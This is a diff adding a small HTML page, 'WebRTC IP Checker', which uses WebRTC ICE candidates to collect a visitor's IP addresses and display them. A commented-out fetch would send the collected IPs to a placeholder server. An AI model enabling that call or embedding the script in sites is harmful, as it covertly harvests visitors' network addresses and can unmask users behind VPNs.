@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebRTC IP Checker</title>
+</head>
+<body>
+    <h1>Your IP Addresses</h1>
+    <pre id="ip-list"></pre>
+
+    <script>
+        function getLocalIPs(callback) {
+            const ips = [];
+            const pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = event => {
+                if (!event || !event.candidate) {
+                    callback(ips);
+                    return;
+                }
+                const parts = event.candidate.candidate.split(' ');
+                const ip = parts[4];
+                if (!ips.includes(ip)) {
+                    ips.push(ip);
+                }
+            };
+        }
+
+        getLocalIPs(ips => {
+            const ipList = document.getElementById('ip-list');
+            ips.forEach(ip => {
+                ipList.textContent += ip + '\n';
+            });
+            // Optionnel : envoyer les IPs à un serveur de votre choix
+            // fetch('http://your-server.com/receive-ip', {
+            //     method: 'POST',
+            //     headers: {'Content-Type': 'application/json'},
+            //     body: JSON.stringify({ips})
+            // });
+        });
+    </script>
+</body>
+</html>
